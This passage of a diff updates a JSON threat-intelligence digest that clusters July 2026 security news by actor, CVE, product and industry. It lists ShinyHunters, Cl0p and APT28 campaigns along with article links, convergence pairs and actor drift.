+            "confidence_tier": "tier_4_news",
+            "role_map": {},
+            "weak_tags": {
+              "products": []
+            }
+          }
+        }
+      ]
+    },
+    {
+      "cluster_id": "ac9cea3220",
+      "priority_score": 8,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [],
+      "taxonomy": {
+        "threat_categories": [
+          "apt_espionage"
+        ],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": [
+          "incident_report"
+        ],
+        "confidence_tier": [
+          "tier_4_news"
+        ]
+      },
+      "primary": {
+        "source": "Infosecurity Magazine",
+        "cohort": "cyber_news_breach_reporting",
+        "title": "Hotel Wi-Fi Routers Compromised to Steal Corporate Login Credentials From Visitors",
+        "link": "https://www.infosecurity-magazine.com/news/hotel-wifi-dns-poisoning/",
+        "published": "2026-07-24T12:00:00+00:00",
+        "summary": "Researchers at ReliaQuest warned of widespread DNS poisoning attacks targeting the hospitality sector as part of a cyber espionage campaign",
+        "full_body": "",
+        "fetch_status": "not_attempted",
+        "taxonomy": {
+          "threat_categories": [
+            "apt_espionage"
+          ],
+          "actor_attribution": [],
+          "affected_industries": [],
+          "affected_products": [],
+          "tools_used": [],
+          "cve_ids": [],
+          "attack_techniques": [],
+          "urgency_signals": [],
+          "content_type": "incident_report",
+          "confidence_tier": "tier_4_news",
+          "role_map": {},
+          "weak_tags": {
+            "products": []
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "Infosecurity Magazine",
+          "cohort": "cyber_news_breach_reporting",
+          "title": "Hotel Wi-Fi Routers Compromised to Steal Corporate Login Credentials From Visitors",
+          "link": "https://www.infosecurity-magazine.com/news/hotel-wifi-dns-poisoning/",
+          "published": "2026-07-24T12:00:00+00:00",
+          "summary": "Researchers at ReliaQuest warned of widespread DNS poisoning attacks targeting the hospitality sector as part of a cyber espionage campaign",
+          "taxonomy": {
+            "threat_categories": [
+              "apt_espionage"
+            ],
+            "actor_attribution": [],
+            "affected_industries": [],
+            "affected_products": [],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [],
+            "content_type": "incident_report",
             "confidence_tier": "tier_4_news",
             "role_map": {},
             "weak_tags": {
@@ -7948,25 +8066,25 @@
       "dominant_features": {
         "threat_categories": [
           "phishing_social_eng",
-          "zero_day"
+          "ransomware_extortion",
+          "data_breach"
         ],
         "actor_attribution": [
           "ShinyHunters"
         ],
         "affected_products": [
           "Salesforce",
-          "Microsoft Entra",
-          "Microsoft 365"
+          "Microsoft 365",
+          "Microsoft Entra"
         ],
         "urgency_signals": [
-          "zero_day",
           "preauth_unauth",
           "poc_available"
         ]
       },
-      "cluster_count": 9,
-      "article_count": 6,
-      "cohesion": 0.369,
+      "cluster_count": 8,
+      "article_count": 7,
+      "cohesion": 0.325,
       "shared_strong_signals": [
         "ShinyHunters"
       ],
@@ -7975,25 +8093,24 @@
         "Microsoft Entra"
       ],
       "cluster_ids": [
+        "efa5d95ebc",
         "14625d1950",
         "17b63d385b",
-        "629e6024b5",
         "7061b2c39d",
         "b788e3a84d",
         "5ef02eeb29",
-        "ac9cea3220",
         "86bb601c47",
         "c68e26f04e"
       ],
       "links": [
+        "https://thehackernews.com/2026/07/cl0p-affiliates-target-internet-exposed.html",
+        "https://www.bleepingcomputer.com/news/security/clop-ransomware-targets-windchill-flexplm-in-data-theft-attacks/",
         "https://cloud.google.com/blog/products/identity-security/find-and-fix-software-vulnerabilities-with-codemender/",
         "https://thehackernews.com/2026/07/google-launches-gemini-35-flash-cyber.html",
         "https://thehackernews.com/2026/07/qilin-ransomware-attackers-exploit-pan.html",
-        "https://thehackernews.com/2026/07/new-7-zip-vulnerability-could-let.html",
         "https://thehackernews.com/2026/07/critical-sharepoint-rce-cve-2026-50522.html",
         "https://thehackernews.com/2026/07/critical-servicenow-ai-platform-flaw.html",
         "https://www.bleepingcomputer.com/news/security/ontrac-notifies-customers-of-data-breach-after-network-hack/",
-        "https://www.infosecurity-magazine.com/news/hotel-wifi-dns-poisoning/",
         "https://trustedsec.com/blog/the-new-hotness-in-phishing-device-code-attacks-in-m365",
         "https://www.bleepingcomputer.com/news/security/australian-energy-provider-origin-says-data-breach-exposes-client-data/"
       ]
@@ -8037,16 +8154,16 @@
       "also_targets": [],
       "cluster_ids": [
         "51bbe21d6c",
-        "abfdfb7a02",
         "332f35118d",
         "1ff0bf04bf",
+        "abfdfb7a02",
         "02b144b02f"
       ],
       "links": [
         "https://www.proofpoint.com/us/newsroom/news/russian-espionage-group-exploited-zimbra-zero-day-steal-mail-and-2fa-codes",
-        "https://www.helpnetsecurity.com/2026/07/24/laundry-bear-zimbra-vulnerability-cve-2025-66376/",
         "https://www.darkreading.com/cyberattacks-data-breaches/russian-hackers-zimbra-zero-day-us-ukraine-targets",
         "https://unit42.paloaltonetworks.com/russian-webmail-espionage/",
+        "https://www.helpnetsecurity.com/2026/07/24/laundry-bear-zimbra-vulnerability-cve-2025-66376/",
         "https://cyberscoop.com/russian-laundry-bear-zimbra-exploit/"
       ]
     },
@@ -8073,7 +8190,7 @@
         ]
       },
       "cluster_count": 3,
-      "article_count": 13,
+      "article_count": 12,
       "cohesion": 0.294,
       "shared_strong_signals": [
         "WordPress"
@@ -8100,50 +8217,6 @@
         "https://www.infosecurity-magazine.com/news/researchers-wordpress-exploit/",
         "https://thehackernews.com/2026/07/hackers-exploit-windmill-flaw-to-read.html",
         "https://research.checkpoint.com/2026/20th-july-threat-intelligence-report/"
-      ]
-    },
-    {
-      "label": "APT28: phishing social eng",
-      "anchor_signal": "APT28",
-      "theme_key": "apt28",
-      "dominant_features": {
-        "threat_categories": [
-          "phishing_social_eng",
-          "apt_espionage",
-          "ransomware_extortion",
-          "zero_day"
-        ],
-        "actor_attribution": [
-          "APT28"
-        ],
-        "affected_industries": [
-          "financial_services",
-          "government"
-        ],
-        "cve_ids": [
-          "CVE-2025-66376"
-        ],
-        "urgency_signals": [
-          "zero_day"
-        ]
-      },
-      "cluster_count": 3,
-      "article_count": 3,
-      "cohesion": 0.562,
-      "shared_strong_signals": [
-        "APT28"
-      ],
-      "member_cves": [],
-      "also_targets": [],
-      "cluster_ids": [
-        "51bbe21d6c",
-        "332f35118d",
-        "ac9cea3220"
-      ],
-      "links": [
-        "https://www.proofpoint.com/us/newsroom/news/russian-espionage-group-exploited-zimbra-zero-day-steal-mail-and-2fa-codes",
-        "https://www.darkreading.com/cyberattacks-data-breaches/russian-hackers-zimbra-zero-day-us-ukraine-targets",
-        "https://www.infosecurity-magazine.com/news/hotel-wifi-dns-poisoning/"
       ]
     },
     {
@@ -8349,7 +8422,14 @@
   ],
   "forward_signals": {
     "novelty": {
-      "cves": [],
+      "cves": [
+        {
+          "value": "CVE-2026-16723",
+          "cluster_id": "e67ac609ab",
+          "first_source": "The Hacker News",
+          "first_published": "2026-07-25T12:52:43+00:00"
+        }
+      ],
       "actors": [],
       "products": []
     },
@@ -8379,9 +8459,7 @@
         "shared_signals": [
           "CVE-2026-60137",
           "CVE-2026-63030",
-          "Microsoft SharePoint",
           "OpenAI/ChatGPT",
-          "SonicWall",
           "WordPress"
         ]
       },
@@ -8414,17 +8492,7 @@
     "convergence": [
       {
         "cluster_id": "56fb338f87",
-        "pair": "CVE-2026-60137 + Microsoft SharePoint",
-        "first_observation": true
-      },
-      {
-        "cluster_id": "56fb338f87",
         "pair": "CVE-2026-60137 + OpenAI/ChatGPT",
-        "first_observation": true
-      },
-      {
-        "cluster_id": "56fb338f87",
-        "pair": "CVE-2026-60137 + SonicWall",
         "first_observation": true
       },
       {
@@ -8434,17 +8502,7 @@
       },
       {
         "cluster_id": "56fb338f87",
-        "pair": "CVE-2026-63030 + Microsoft SharePoint",
-        "first_observation": true
-      },
-      {
-        "cluster_id": "56fb338f87",
         "pair": "CVE-2026-63030 + OpenAI/ChatGPT",
-        "first_observation": true
-      },
-      {
-        "cluster_id": "56fb338f87",
-        "pair": "CVE-2026-63030 + SonicWall",
         "first_observation": true
       },
       {
@@ -8468,27 +8526,93 @@
         "first_observation": true
       },
       {
-        "cluster_id": "c4020d76d0",
-        "pair": "CVE-2021-27137 + AWS",
+        "cluster_id": "efa5d95ebc",
+        "pair": "CVE-2026-12569 + Cl0p",
         "first_observation": true
       },
       {
-        "cluster_id": "c4020d76d0",
-        "pair": "CVE-2021-27137 + WordPress",
+        "cluster_id": "efa5d95ebc",
+        "pair": "CVE-2026-12569 + ShinyHunters",
         "first_observation": true
       },
       {
-        "cluster_id": "c4020d76d0",
-        "pair": "CVE-2026-0770 + AWS",
+        "cluster_id": "efa5d95ebc",
+        "pair": "CVE-2026-12569 + Microsoft 365",
         "first_observation": true
       },
       {
-        "cluster_id": "c4020d76d0",
-        "pair": "CVE-2026-0770 + WordPress",
+        "cluster_id": "efa5d95ebc",
+        "pair": "CVE-2026-12569 + Microsoft Entra",
+        "first_observation": true
+      },
+      {
+        "cluster_id": "efa5d95ebc",
+        "pair": "Cl0p + Microsoft Entra",
+        "first_observation": true
+      },
+      {
+        "cluster_id": "efa5d95ebc",
+        "pair": "Cl0p + Salesforce",
+        "first_observation": true
+      },
+      {
+        "cluster_id": "efa5d95ebc",
+        "pair": "ShinyHunters + Microsoft 365",
+        "first_observation": true
+      },
+      {
+        "cluster_id": "efa5d95ebc",
+        "pair": "ShinyHunters + Microsoft Entra",
         "first_observation": true
       }
     ],
     "drift": [
+      {
+        "actor": "Cl0p",
+        "cluster_id": "efa5d95ebc",
+        "new_industries": [
+          "aviation_defense",
+          "manufacturing_industrial",
+          "retail_ecommerce"
+        ],
+        "new_products": [
+          "Microsoft Entra",
+          "Salesforce"
+        ],
+        "prior_top_industries": [
+          "financial_services",
+          "government",
+          "healthcare"
+        ],
+        "prior_top_products": [
+          "GitHub",
+          "Microsoft 365",
+          "SolarWinds"
+        ]
+      },
+      {
+        "actor": "ShinyHunters",
+        "cluster_id": "efa5d95ebc",
+        "new_industries": [
+          "aviation_defense",
+          "manufacturing_industrial",
+          "retail_ecommerce"
+        ],
+        "new_products": [
+          "Microsoft 365",
+          "Microsoft Entra"
+        ],
+        "prior_top_industries": [
+          "education",
+          "financial_services",
+          "government"
+        ],
+        "prior_top_products": [
+          "Anthropic/Claude",
+          "Salesforce",
+          "npm"
+        ]
+      },
       {
         "actor": "APT28",
         "cluster_id": "51bbe21d6c",
@@ -8503,25 +8627,6 @@
         ],
         "prior_top_products": [
           "Microsoft Entra"
-        ]
-      },
-      {
-        "actor": "ShinyHunters",
-        "cluster_id": "17b63d385b",
-        "new_industries": [],
-        "new_products": [
-          "Microsoft Entra",
-          "Palo Alto Networks"
-        ],
-        "prior_top_industries": [
-          "education",
-          "financial_services",
-          "government"
-        ],
-        "prior_top_products": [
-          "Anthropic/Claude",
-          "Salesforce",
-          "npm"
         ]
       },
       {
@@ -8547,7 +8652,7 @@
       {
         "axis": "actor_attribution",
         "value": "ShinyHunters",
-        "cluster_id": "17b63d385b",
+        "cluster_id": "efa5d95ebc",
         "weeks_observed": 8
       },
       {
@@ -8555,6 +8660,12 @@
         "value": "CVE-2026-45659",
         "cluster_id": "7061b2c39d",
         "weeks_observed": 5
+      },
+      {
+        "axis": "actor_attribution",
+        "value": "Cl0p",
+        "cluster_id": "efa5d95ebc",
+        "weeks_observed": 4
       },
       {
         "axis": "cve_ids",
@@ -8578,6 +8689,12 @@
         "axis": "cve_ids",
         "value": "CVE-2026-46331",
         "cluster_id": "3574a7b873",
+        "weeks_observed": 3
+      },
+      {
+        "axis": "cve_ids",
+        "value": "CVE-2026-12569",
+        "cluster_id": "efa5d95ebc",
         "weeks_observed": 3
       },
       {
